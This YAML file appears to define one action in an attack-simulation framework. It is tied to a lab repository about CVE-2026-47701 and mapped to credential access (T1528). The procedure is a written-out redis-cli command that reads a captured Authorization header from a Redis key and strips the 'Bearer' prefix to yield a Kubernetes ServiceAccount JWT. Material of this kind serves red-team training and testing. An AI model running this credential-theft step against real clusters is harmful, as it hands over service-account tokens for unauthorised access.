id: extract-serviceaccount-token-via-cve-2026-47701
name: Extract ServiceAccount Token via CVE-2026-47701
description: >-
  Extract a bearer credential captured through the CVE-2026-47701
  ServiceMonitor chain from a Redis key, remove its Bearer prefix, and emit
  only the JWT. The rawServiceaccountToken effect validates and parses the JWT
  claims into Ran's ServiceAccount, Namespace, and Pod facts. The command runs
  from an established foothold and connects to the selected Redis target over
  the network, avoiding recursive execution inside Redis.
tactic: Credential Access
techniques: ["Steal Application Access Token", "T1528"]
parameters:
  TARGET:
    type: string
    default: ${TARGET.IP}
    description: the DNS name or IP address of the selected Redis service
  PORT:
    type: int
    default: 6379
    description: the port on which the Redis service is running
  REDIS_KEY:
    type: string
    default: oopservability:receiver:last-authorization
    description: the Redis key containing the captured Authorization value
procedures:
  - key: redis-cli
    tool: redis-cli
    runOnTarget: false
    command: >-
      redis-cli -h ${TARGET} -p ${PORT} --raw GET ${REDIS_KEY} | sed -n 's/^Bearer //p'
preconditions:
  kind: Pod
  accessLevel: user-exec
  exists:
    - kind: ServiceMonitor
      name: redis-metrics
effects:
  - rawServiceaccountToken
references:
  - https://github.com/Magier/Oopserability/blob/main/manifests/cve-2026-47701/README.md
